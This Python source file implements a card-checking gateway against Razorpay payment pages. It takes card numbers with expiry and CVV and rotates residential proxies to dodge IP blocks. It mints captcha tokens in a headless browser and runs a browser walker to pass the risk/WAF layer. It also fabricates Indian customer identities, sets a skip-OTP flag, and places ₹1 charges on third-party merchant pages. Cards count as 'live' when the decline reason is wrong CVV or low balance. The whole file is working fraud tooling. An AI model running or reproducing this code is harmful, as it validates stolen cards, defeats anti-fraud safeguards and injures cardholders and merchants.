import asyncio
import hashlib
import json
import os
import random
import re
import secrets
import string
import sys
import time
from urllib.parse import quote, urlsplit
import aiohttp
import types as _types

def _norm_proxy(s) -> str:
    """Normalize pool formats (host:port:user:pass, user:pass@host:port, url) to http URLs."""
    s = str(s).strip()
    if s.startswith("http://") or s.startswith("https://"):
        return s
    if "@" in s:
        creds, hostport = s.rsplit("@", 1)
        return f"http://{creds}@{hostport}"
    parts = s.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    return "http://" + s


def _hp(s):
    v = urlsplit(_norm_proxy(s))
    return (v.hostname or "", v.port or 8080)


try:
    from proxy import get_alive_pool_http
except Exception:
    try:
        from database import get_global_proxies

        def get_alive_pool_http():
            return get_global_proxies()
    except Exception:
        def get_alive_pool_http():
            return []
config = _types.ModuleType("rz_config")
config.ROTATING_PROXY_HTTP = None
RAZORPAY_PAGE_URL = "https://pages.razorpay.com/myglobalhost"

SITES_FILE = os.environ.get("RZ_SITES_FILE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites_razor.txt"))

from gates.hsin_stripe_auth.bin_lookup import lookup_bin, country_flag, random_str

_TIMEOUT = aiohttp.ClientTimeout(total=30)
BUILD = "afa3662e035e66c495f2ddc21c6f030530870f53"
BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"

FIRST_NAMES = ["Aarav", "Vivaan", "Aditya", "Arjun", "Sai", "Rohan", "Rahul", "Amit", "Vikram", "Sanjay"]
LAST_NAMES = ["Sharma", "Patel", "Singh", "Verma", "Gupta", "Reddy", "Kumar", "Mehta", "Joshi", "Nair"]


async def mint_rz_captcha(site: str, proxy: str = None) -> dict:
    """
    Mint a reCAPTCHA token for a Razorpay payment page via headless chromium
    (gates/hsin_rz/captcha.py). Razorpay order creation requires a captcha object;
    server-side anchor/reload minting no longer passes siteverify, so the token has
    to come from a real grecaptcha client run in a browser through the resi proxy.
    Returns the order-POST 'captcha' object, or {} when minting failed.
    """
    proxy = proxy or getattr(config, "ROTATING_PROXY_HTTP", None)
    args = {"site": site, "proxy_server": None, "proxy_user": None, "proxy_pass": None}
    if proxy:
        u = urlsplit(proxy if proxy.startswith("http") else "http://" + proxy)
        args["proxy_server"] = f"{u.scheme or 'http'}://{u.hostname}:{u.port or 8080}"
        if u.username:
            args["proxy_user"] = u.username
            args["proxy_pass"] = u.password or ""
    try:
        # the mint needs a python that has playwright — RZ_CAPTCHA_PYTHON to override
        cap_py = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captcha.py")
        proc = await asyncio.create_subprocess_exec(
            os.environ.get("RZ_CAPTCHA_PYTHON", sys.executable), cap_py, json.dumps(args),
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL,
        )
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=110)
        data = json.loads(out.decode(errors="ignore"))
        return data.get("captcha") or {}
    except Exception:
        return {}


def load_razorpay_sites() -> list:
    sites_file = SITES_FILE
    if os.path.exists(sites_file):
        try:
            with open(sites_file, "r") as f:
                sites = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            return sites
        except Exception:
            pass
    return []


def remove_razorpay_site(site_url: str):
    clean = site_url.strip()
    sites_file = SITES_FILE
    try:
        if os.path.exists(sites_file):
            with open(sites_file, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            new_lines = [l for l in lines if l != clean and not l.endswith(clean.split("/")[-1])]
            if len(new_lines) != len(lines):
                with open(sites_file, "w") as f:
                    f.write("\n".join(new_lines) + "\n")
    except Exception:
        pass


async def validate_razorpay_site(site_url: str, session: aiohttp.ClientSession = None, proxy: str = None) -> tuple[bool, str]:
    """
    Validates a candidate Razorpay site URL by ensuring it loads payment link items
    and can successfully create a ₹1 test order without encountering errors or deactivations.
    Returns (is_valid: bool, reason: str).
    """
    clean = str(site_url).strip()
    if not clean.startswith("http"):
        clean = "https://" + clean

    proxy = proxy or getattr(config, "ROTATING_PROXY_HTTP", None)
    ua = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/131.0.0.0 Safari/537.36"
    )
    headers = {"User-Agent": ua}
    timeout = aiohttp.ClientTimeout(total=10)

    close_session = False
    if session is None:
        connector = aiohttp.TCPConnector(ssl=False)
        session = aiohttp.ClientSession(connector=connector)
        close_session = True

    try:
        async with session.get(clean, headers=headers, proxy=proxy, timeout=timeout) as resp:
            if resp.status != 200:
                return False, f"HTTP {resp.status}"
            text = await resp.text()

        m = re.search(r'var data = ({.*?});', text, re.DOTALL)
        if not m:
            return False, "Not a Razorpay payment page"

        data = json.loads(m.group(1))
        pl = data.get("payment_link", {})
        plink = pl.get("id")
        items = pl.get("payment_page_items", [])
        if not plink or not items:
            return False, "Payment page deactivated or has no items"

        ppid = items[0]["id"]
        headers_order = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://pages.razorpay.com',
            'Referer': f"{clean}/",
            'User-Agent': ua,
        }
        json_order = {
            'notes': {'comment': '', 'name': 'Verification Probe', 'email': 'probe.verify@gmail.com', 'phone': '+919876543210'},
            'line_items': [{'payment_page_item_id': ppid, 'amount': 100}],
        }
        cap = await mint_rz_captcha(clean, proxy)
        if cap:
            json_order["captcha"] = cap
        async with session.post(
            f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
            headers=headers_order,
            json=json_order,
            proxy=proxy,
            timeout=timeout
        ) as r_order:
            order_text = (await r_order.text() or "").strip()
            if "incident has been reported" in order_text.lower() or "encountered an error" in order_text.lower():
                return False, "Server incident error"
            try:
                order_json = json.loads(order_text)
            except Exception:
                return False, "Invalid order response"

            if not order_json.get("order", {}).get("id"):
                desc = order_json.get("error", {}).get("description", "Order creation rejected")
                return False, desc

        return True, "Valid Razorpay payment page"
    except Exception as e:
        return False, str(e)
    finally:
        if close_session:
            await session.close()


async def add_razorpay_sites_bulk(sites_list: list, progress_cb=None) -> tuple[int, int, list]:
    """
    Checks each site in sites_list with concurrency and only adds healthy/working ones to the pool.
    Reports progress via progress_cb(processed, total, valid_cnt, invalid_cnt).
    Returns (added_count, total_count, failed_sites_with_reasons).
    """
    sites_file = SITES_FILE
    current_sites = load_razorpay_sites()
    seen = set(current_sites)

    candidates = []
    for s in sites_list:
        clean = str(s).strip()
        if not clean or clean.startswith("#"):
            continue
        if not clean.startswith("http"):
            clean = "https://" + clean
        if clean not in seen and clean not in candidates:
            candidates.append(clean)

    if not candidates:
        if progress_cb:
            try:
                await progress_cb(0, 0, 0, 0)
            except Exception:
                pass
        return 0, len(current_sites), []

    total_to_check = len(candidates)
    added = 0
    failed = []
    processed = 0
    sem = asyncio.Semaphore(15)
    file_lock = asyncio.Lock()

    if progress_cb:
        try:
            await progress_cb(0, total_to_check, 0, 0)
        except Exception:
            pass

    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def check_task(url):
            nonlocal added, processed
            async with sem:
                is_valid, reason = await validate_razorpay_site(url, session=session)
                async with file_lock:
                    processed += 1
                    if is_valid:
                        current_sites.append(url)
                        seen.add(url)
                        added += 1
                    else:
                        failed.append((url, reason))

                    cur_processed = processed
                    cur_added = added
                    cur_failed = len(failed)

                if progress_cb:
                    try:
                        await progress_cb(cur_processed, total_to_check, cur_added, cur_failed)
                    except Exception:
                        pass

        await asyncio.gather(*[check_task(u) for u in candidates])

    if added > 0:
        try:
            with open(sites_file, "w") as f:
                f.write("\n".join(current_sites) + "\n")
        except Exception as e:
            print(f"[add_razorpay_sites_bulk] {e}")

    return added, len(current_sites), failed


async def add_razorpay_site(site_url: str) -> tuple[bool, str]:
    """Validates and adds a single Razorpay site URL."""
    clean = site_url.strip()
    if not clean.startswith("http"):
        clean = "https://" + clean
    sites_file = SITES_FILE
    sites = load_razorpay_sites()
    if clean in sites:
        return False, "Link already exists in pool"

    is_valid, reason = await validate_razorpay_site(clean)
    if not is_valid:
        return False, reason

    sites.append(clean)
    try:
        with open(sites_file, "w") as f:
            f.write("\n".join(sites) + "\n")
        return True, "Valid Razorpay payment page added"
    except Exception as e:
        return False, f"Failed to save site: {e}"


def clear_razorpay_sites() -> bool:
    base_dir = os.path.dirname(os.path.dirname(__file__))
    for fname in ["sites_razor.txt", "rz.txt"]:
        fpath = os.path.join(base_dir, fname)
        try:
            if os.path.exists(fpath):
                with open(fpath, "w") as f:
                    f.write("")
        except Exception:
            pass
    return True


def get_card_brand(card_number: str) -> str:
    if card_number.startswith("4"):
        return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55") or (len(card_number) >= 4 and 2221 <= int(card_number[:4]) <= 2720):
        return "mastercard"
    elif card_number[:2] in ("34", "37"):
        return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65") or card_number[:3] in ("644", "645"):
        return "discover"
    elif card_number.startswith("35"):
        return "jcb"
    elif card_number.startswith("62"):
        return "unionpay"
    elif card_number[:2] in ("50", "56", "57", "58") or card_number[:4] in ("6759", "6761", "6762", "6763"):
        return "maestro"
    elif card_number.startswith("60") or card_number.startswith("65") or card_number[:4] in ("5085", "5086", "5087", "5088", "5089"):
        return "rupay"
    return "unknown"


def gen_indian_phone() -> str:
    first_digit = secrets.choice(['6', '7', '8', '9'])
    rest = ''.join(str(secrets.randbelow(10)) for _ in range(9))
    return first_digit + rest


async def check_razorpay(cc: str, mm: str, yy: str, cvv: str, proxy: str = None, site: str = None) -> dict:
    # ── proxy is MANDATORY — razorpay blocks datacenter IPs at checkout ──
    if not proxy or str(proxy).strip() in ("", "no"):
        return {
            "status": "ERROR", "is_live": False,
            "response": "proxy parameter is MANDATORY — razorpay blocks datacenter IPs at the checkout step. "
                        "Use a resi proxy: GET /razorpay-135-1?cc=...&proxy=http://user:pass@host:port",
            "message": "proxy is MANDATORY",
            "cc": f"{cc}|{mm}|{yy}|{cvv}",
            "gateway_name": "Razorpay ₹1",
        }
    proxy = proxy or getattr(config, "ROTATING_PROXY_HTTP", None)
    result = {
        "status": "ERROR",
        "message": "Unknown error",
        "card_brand": "",
        "card_type": "",
        "card_country": "",
        "card_country_name": "",
        "country_flag": "",
        "bank": "",
        "is_live": False,
        "cc": f"{cc}|{mm}|{yy}|{cvv}",
        "response": "",
        "gateway_name": "Razorpay ₹1",
    }

    connector = aiohttp.TCPConnector(ssl=False)
    session = aiohttp.ClientSession(connector=connector)

    try:
        bin_info = await lookup_bin(session, cc[:6])
        result["card_brand"] = bin_info.get("brand", "").upper()
        result["card_type"] = bin_info.get("type", "").upper()
        result["card_country"] = bin_info.get("country", "").upper()
        result["card_country_name"] = bin_info.get("country_name", "").upper()
        result["country_flag"] = bin_info.get("country_flag", "")
        result["bank"] = bin_info.get("bank", "")

        year_full = int("20" + yy[-2:]) if len(yy) <= 2 else int(yy)
        brand = get_card_brand(cc)

        h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
        ts = str(int(time.time() * 1000))
        rnd = str(secrets.randbelow(10**8)).zfill(8)
        rzp_device_id = f"1.{h}.{ts}.{rnd}"
        BASE62 = string.ascii_letters + string.digits
        rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))

        ua = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/131.0.0.0 Safari/537.36"
        )
        phone_short = gen_indian_phone()
        phone_full = f"+91{phone_short}"
        first_n = secrets.choice(FIRST_NAMES)
        last_n = secrets.choice(LAST_NAMES)
        name = f"{first_n} {last_n}"
        email = f"{first_n.lower()}.{last_n.lower()}{secrets.randbelow(999)}@gmail.com"
        amo = 100  # 1 INR = 100 paise

        # 1. Fetch Razorpay page & create order from verified international site pool
        init_data = None
        target_site = RAZORPAY_PAGE_URL
        order_data = None
        order_id = None
        checkout_id = None
        plink = None
        keyless_header = ""
        kyid = "rzp_live_GgVi6JQjMbAj2q"

        if site and str(site).strip():
            s = str(site).strip()
            if s.startswith("@"):
                s = "https://razorpay.me/" + s
            elif not s.startswith("http"):
                s = "https://" + s
            candidate_sites = [s]
        else:
            candidate_sites = load_razorpay_sites()
        if not candidate_sites:
            return {
                "status": "ERROR",
                "is_live": False,
                "response": f"Sites pool ({SITES_FILE}) is empty — add Razorpay payment-page URLs to it.",
                "message": f"Sites pool ({SITES_FILE}) is empty — add Razorpay payment-page URLs to it.",
                "cc": f"{cc}|{mm}|{yy}|{cvv}",
                "card_brand": bin_info.get("brand") or "",
                "card_country": bin_info.get("country") or "",
                "card_country_name": bin_info.get("country_name") or "",
                "country_flag": bin_info.get("country_flag") or "🏳️",
                "bank": bin_info.get("bank") or "",
            }
        # ── 0. Browser walker first — the aiohttp create/ajax gets blocked by
        # razorpay's risk/WAF layer (403) because the shield payload is
        # incomplete; a real browser session passes it. pay.py walks the page
        # like a human and returns the verdict from the gateway's own response.
        # SITE_FAIL/ERROR per site → try next; verdict → return. ──
        pay_py = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pay.py")
        walker_attempts = 0
        last_walker_resp = ""
        used_proxies = set()
        walker_t0 = time.time()
        try:
          for site in list(candidate_sites)[:2]:
              # up to 3 passes per site: pages like razorpay.me reject some proxy
              # IPs outright ("Couldn't verify this request") and others flake
              # mid-walk ("Gateway Connection Error") — each retry takes a fresh
              # proxy; wall-clock guard keeps us inside the 280s budget
              for attempt_no in (1, 2, 3):
                  if attempt_no > 1 and time.time() - walker_t0 > 120:
                      break
                  print(f"[RZWALK] enter site={site} attempt={attempt_no} t={time.time()-walker_t0:.0f}s", flush=True)
                  args = {"site": site, "card": cc, "mm": mm, "yy": str(year_full), "cvv": cvv,
                          "proxy_server": None, "proxy_user": None, "proxy_pass": None}
                  if attempt_no > 1:
                      fresh = next((p for p in get_alive_pool_http() if _hp(p) not in used_proxies), None)
                      if not fresh:
                          break
                      proxy = _norm_proxy(fresh)
                  if proxy:
                      used_proxies.add(_hp(proxy))
                      u = urlsplit(proxy)
                      args["proxy_server"] = f"{u.scheme or 'http'}://{u.hostname}:{u.port or 8080}"
                      if u.username:
                          args["proxy_user"] = u.username
                          args["proxy_pass"] = u.password or ""
                  try:
                      proc = await asyncio.create_subprocess_exec(
                          os.environ.get("RZ_CAPTCHA_PYTHON", sys.executable), pay_py, json.dumps(args),
                          stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL,
                      )
                      try:
                          out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=140)
                      except (asyncio.TimeoutError, Exception):
                          try:
                              proc.kill()
                          except Exception:
                              pass
                          raise
                      data = json.loads(out_b.decode(errors="ignore"))
                  except Exception as e:
                      print(f"[RZWALK] attempt={attempt_no} subprocess EXC: {type(e).__name__}", flush=True)
                      break
                  walker_attempts += 1
                  last_walker_resp = f"{site}: {data.get('response', '')}"
                  print(f"[RZWALK] site={site} attempt={attempt_no} "
                        f"proxy={args.get('proxy_server')} status={data.get('status')} "
                        f"resp={str(data.get('response'))[:80]}", flush=True)
                  st = str(data.get("status", "")).upper()
                  if st in ("APPROVED", "DECLINED", "REQUIRES_ACTION"):
                      resp_text = str(data.get("response") or "Payment failed")
                      result.update(status=st, message=resp_text, response=resp_text,
                                    raw_response=str(data.get("raw", ""))[:4000])
                      return result
                  # SITE_FAIL / ERROR → retry same site on a fresh proxy, then next site

        except Exception as _wexc:
            print(f"[RZWALK] LOOP EXC: {type(_wexc).__name__}: {str(_wexc)[:150]}", flush=True)
        print(f"[RZWALK] done attempts={walker_attempts} last={last_walker_resp[:80]}", flush=True)
        if walker_attempts:
            msg = last_walker_resp or "Razorpay checkout did not respond"
            result.update(status="DECLINED", message="Payment Page Unavailable", response=msg)
            return result

        last_fail = ""
        for site in candidate_sites:
            try:
                async with session.get(site, headers={"User-Agent": ua}, proxy=proxy, timeout=_TIMEOUT) as r_init:
                    init_text = await r_init.text()
                m = re.search(r'var data = ({.*?});', init_text, re.DOTALL)
                if not m:
                    last_fail = f"{site}: not a razorpay payment page"
                    continue
                candidate = json.loads(m.group(1))
                pl = candidate.get("payment_link", {})
                items = pl.get("payment_page_items", [])
                cand_plink = pl.get("id")
                if not cand_plink or not items:
                    last_fail = f"{site}: page deactivated or no items"
                    continue

                cand_ppid = items[0]["id"]
                cand_keyless = candidate.get("keyless_header", "")
                cand_kyid = candidate.get("key_id") or "rzp_live_GgVi6JQjMbAj2q"

                # Attempt order creation on this candidate site
                headers_order = {
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'Origin': 'https://pages.razorpay.com',
                    'Referer': f"{site}/",
                    'User-Agent': ua,
                }
                json_order = {
                    'notes': {'comment': '', 'name': name, 'email': email, 'phone': phone_full},
                    'line_items': [{'payment_page_item_id': cand_ppid, 'amount': amo}],
                }
                cap = await mint_rz_captcha(site, proxy)
                if cap:
                    json_order["captcha"] = cap
                else:
                    last_fail = f"{site}: captcha mint failed"
                async with session.post(
                    f"https://api.razorpay.com/v1/payment_pages/{cand_plink}/order",
                    headers=headers_order,
                    json=json_order,
                    proxy=proxy,
                    timeout=_TIMEOUT
                ) as r_order:
                    raw_ord_txt = await r_order.text()
                    if "incident has been reported" in raw_ord_txt.lower() or "encountered an error" in raw_ord_txt.lower():
                        # Server incident on this specific merchant link, prune and try next
                        remove_razorpay_site(site)
                        last_fail = f"{site}: server incident at order"
                        continue

                    try:
                        cand_order_data = json.loads(raw_ord_txt)
                    except Exception:
                        last_fail = f"{site}: unparseable order response ({raw_ord_txt[:80]})"
                        continue

                    cand_order_id = cand_order_data.get("order", {}).get("id")
                    if cand_order_id:
                        init_data = candidate
                        target_site = site
                        order_data = cand_order_data
                        order_id = cand_order_id
                        checkout_id = order_id.split("_")[1]
                        plink = cand_plink
                        keyless_header = cand_keyless
                        kyid = cand_kyid
                        break
                    else:
                        err_desc = cand_order_data.get("error", {}).get("description", "")
                        no_cap = "no captcha minted" if not cap else ""
                        last_fail = f"{site}: {err_desc or raw_ord_txt[:80]}{no_cap}"
                        if "deactivated" in err_desc.lower() or "inactive" in err_desc.lower():
                            remove_razorpay_site(site)
            except Exception as e:
                last_fail = f"{site}: {type(e).__name__}: {str(e)[:60]}"
                continue

        if not init_data or not order_id:
            msg = last_fail or "Razorpay checkout did not respond"
            result.update(status="DECLINED", message="Payment Page Unavailable", response=msg)
            return result

        # 3. Checkout public
        params_public = {
            'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
            'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
            'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
        }
        async with session.get(
            'https://api.razorpay.com/v1/checkout/public',
            params=params_public,
            headers={'Referer': 'https://pages.razorpay.com/', 'User-Agent': ua},
            proxy=proxy,
            timeout=_TIMEOUT
        ) as r_public:
            public_text = await r_public.text()

        m_sess = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', public_text)
        sessid = m_sess.group(1) if m_sess else ""
        if not sessid:
            result.update(status="ERROR", message="Session token not found", response="Session token missing")
            return result

        # 4. Standard checkout preferences
        headers_pref = {
            'Accept': '*/*', 'Content-type': 'application/json', 'Origin': 'https://api.razorpay.com',
            'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
            'User-Agent': ua, 'x-session-token': sessid,
        }
        params_pref = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
        json_pref = {
            'query': [{'resource': r} for r in ['checkout_version_config', 'merchant', 'merchant_features', 'customer', 'methods', 'order']],
            'query_params': {
                'device_id': rzp_device_id, 'rtb_device_id': h, 'amount': amo,
                'currency': 'INR', 'option_currency': 'INR', 'truecaller': False,
                'qr_required': False, 'library': 'checkoutjs', 'platform': 'browser',
                'order_id': order_id, 'payment_link_id': plink, 'contact': phone_full,
            },
            'action': 'get',
        }
        async with session.post(
            'https://api.razorpay.com/v2/standard_checkout/preferences',
            params=params_pref,
            headers=headers_pref,
            json=json_pref,
            proxy=proxy,
            timeout=_TIMEOUT
        ) as r_pref:
            pref_raw = await r_pref.text()
            m_key = re.search(r'"key":\s*"(rzp_live_[A-Za-z0-9]+)"', pref_raw)
            if m_key:
                kyid = m_key.group(1)

        # 5. Skip OTP customer status check (explicitly bypasses mobile OTP)
        params_cust = {
            "key_id": kyid, "session_token": sessid, "keyless_header": keyless_header,
            "skip_otp": "true", "strict": "true", "otp_verify_v2": "true", "_[platform]": "browser",
        }
        async with session.get(
            f"https://api.razorpay.com/v2/standard_checkout/customers/status/{phone_full}",
            params=params_cust,
            headers={"User-Agent": ua, "Referer": "https://api.razorpay.com/v1/checkout/public", "x-session-token": sessid},
            proxy=proxy,
            timeout=_TIMEOUT
        ):
            pass

        # 6. Payment Create (Ajax) - save: "0", no card saving, no OTP
        headers_create = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://api.razorpay.com',
            'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
            'User-Agent': ua,
            'x-session-token': sessid,
        }
        params_create = {
            'key_id': kyid,
            'session_token': sessid,
            'keyless_header': keyless_header,
        }
        data_create = {
            'contact': phone_full,
            'email': email,
            'currency': 'INR',
            'notes[name]': name,
            'notes[email]': email,
            'notes[phone]': phone_full,
            'payment_link_id': plink,
            '_[integration]': 'payment_pages',
            '_[checkout_id]': checkout_id,
            '_[device_id]': rzp_device_id,
            '_[library]': 'checkoutjs',
            '_[library_src]': 'no-src',
            '_[current_script_src]': 'no-src',
            '_[platform]': 'browser',
            '_[os]': 'windows',
            '_[referer]': f"{target_site}#",
            '_[shield][fhash]': h,
            '_[shield][tz]': '330',
            '_[build]': BUILD,
            '_[request_index]': '1',
            'amount': str(amo),
            'order_id': order_id,
            'method': 'card',
            'card[number]': cc,
            'card[cvv]': cvv,
            'card[name]': name,
            'card[expiry_month]': mm,
            'card[expiry_year]': str(year_full),
            'save': '0',
        }
        async with session.post(
            'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
            params=params_create,
            headers=headers_create,
            data=data_create,
            proxy=proxy,
            timeout=_TIMEOUT
        ) as r_create:
            result["raw_response"] = await r_create.text()
            result["raw_status"] = r_create.status
            try:
                pay_json = await r_create.json(content_type=None)
            except Exception:
                pay_text = (await r_create.text() or "").strip()
                pay_lower = pay_text.lower()
                if "server encountered an error" in pay_lower:
                    result.update(status="DECLINED", message="The server encountered an error. The incident has been reported to admins.", response="The server encountered an error (store front crashed)")
                    return result
                if "403" in pay_text or pay_text.lstrip().startswith("<"):
                    result.update(status="DECLINED", message="Card Declined", response="Blocked by Risk Layer (403)")
                    return result
                result.update(status="DECLINED", message="Payment Failed", response=pay_text[:100])
                return result

        if not isinstance(pay_json, dict):
            result.update(status="DECLINED", message="Card Declined", response="Card Declined (Empty Response)")
            return result

        # ── capture the FULL raw response for the /rz panel (hzin parity) ──
        result["raw_response"] = json.dumps(pay_json, indent=1, default=str)[:4000]

        # Step 7: Parse Payment Response
        if "error" in pay_json:
            err = pay_json["error"]
            code = err.get("code", "")
            reason = err.get("reason", "")
            desc = err.get("description", "Payment Failed")
            step = err.get("step", "")
            desc_clean = desc.replace(
                " Try another payment method or contact your bank for details.", ""
            ).replace(
                "Try another payment method or contact your bank for details.", ""
            ).strip()
            desc_lower = desc_clean.lower()
            reason_lower = reason.lower()
            # ── return the rz gateway's own error description VERBATIM ──
            response_text = desc_clean if desc_clean else (reason or "Payment failed")
            result["raw_response"] = response_text
            if any(k in desc_lower or k in reason_lower for k in ["insufficient_account_balance", "insufficient_balance", "account_balance_low"]):
                result.update(status="APPROVED", is_live=True, message=response_text, response=response_text)
            elif any(k in desc_lower or k in reason_lower for k in ["cvv provided is incorrect", "incorrect_cvv", "invalid_cvv", "cvv"]):
                result.update(status="APPROVED", is_live=True, message=response_text, response=response_text)
            elif any(k in desc_lower or k in reason_lower for k in ["maximum transaction limit", "transaction_limit_exceeded"]):
                result.update(status="APPROVED", is_live=True, message=response_text, response=response_text)
            elif any(k in desc_lower or k in reason_lower for k in ["requires_action", "authentication_required", "3ds"]) or (step == "payment_authentication" and "declined" not in reason_lower):
                result.update(status="REQUIRES_ACTION", is_live=False, message=response_text, response=response_text)
            elif "international" in desc_lower or "international_transaction_not_allowed" in reason_lower:
                remove_razorpay_site(target_site)
                result.update(status="DECLINED", message=response_text, response=response_text)
            elif "card_number_invalid" in reason_lower or "card number is invalid" in desc_lower:
                result.update(status="DECLINED", message=response_text, response=response_text)
            elif "expired_card" in reason_lower or "expired" in desc_lower:
                result.update(status="DECLINED", message=response_text, response=response_text)
            elif reason == "card_declined" or "card_declined" in reason_lower:
                result.update(status="DECLINED", message=response_text, response=response_text)
            else:
                result.update(status="DECLINED", message=response_text, response=response_text)
            return result

        # Check for 3DS / Action challenge
        is_3ds = (
            pay_json.get("redirect") is True
            or pay_json.get("type") == "redirect"
            or "next" in pay_json
            or "auth_step" in pay_json
            or "authenticate" in str(pay_json).lower()
        )
        if is_3ds:
            result.update(status="REQUIRES_ACTION", is_live=False, message="3DS Required", response="3DS Requires Action")
            return result

        status_str = pay_json.get("status", "").lower()
        if status_str in ("captured", "authorized", "paid") or "razorpay_payment_id" in pay_json:
            result.update(status="APPROVED", is_live=True, message="Charged ₹1.00", response="Charged ₹1.00 (Success)")
            return result

        # Check final status via cancel probe if needed
        payment_id = pay_json.get("payment_id") or pay_json.get("id") or (pay_json.get("metadata", {}).get("payment_id"))
        if payment_id:
            headers_fin = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            params_fin = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            async with session.get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel",
                params=params_fin,
                headers=headers_fin,
                proxy=proxy,
                timeout=_TIMEOUT
            ) as r_fin:
                try:
                    final_json = await r_fin.json(content_type=None)
                except Exception:
                    final_json = {}
                if isinstance(final_json, dict) and "error" in final_json:
                    err = final_json["error"]
                    reason = err.get("reason", "")
                    desc = err.get("description", "")
                    desc_lower = desc.lower()
                    reason_lower = reason.lower()
                    if any(k in desc_lower or k in reason_lower for k in ["insufficient account balance", "insufficient_balance", "account_balance_low"]):
                        result.update(status="APPROVED", is_live=True, message="Insufficient Balance", response="Insufficient Balance")
                        return result
                    elif any(k in desc_lower or k in reason_lower for k in ["cvv provided is incorrect", "incorrect_cvv", "invalid_cvv", "cvv"]):
                        result.update(status="APPROVED", is_live=True, message="CCN Live (Wrong CVV)", response="CCN Live (Wrong CVV)")
                        return result
                    elif any(k in desc_lower or k in reason_lower for k in ["requires_action", "authentication", "3ds"]):
                        result.update(status="REQUIRES_ACTION", is_live=False, message="3DS Required", response="3DS Requires Action")
                        return result
                    elif reason == "card_declined":
                        result.update(status="DECLINED", message="Card Declined", response="Card Declined (Declined by Bank)")
                        return result
                    else:
                        result.update(status="DECLINED", message=desc or "Card Declined", response=desc or "Card Declined")
                        return result
                elif "razorpay_payment_id" in str(final_json):
                    result.update(status="APPROVED", is_live=True, message="Charged ₹1.00", response="Charged ₹1.00 (Success)")
                    return result

        result.update(status="DECLINED", message="Card Declined", response="Card Declined")

    except asyncio.TimeoutError:
        result.update(status="DECLINED", message="Timeout", response="Connection Timeout (Retry)")
    except Exception as e:
        result.update(status="DECLINED", message="Gateway Error", response="Gateway Connection Error")
    finally:
        try:
            await session.close()
        except Exception:
            pass

    return result
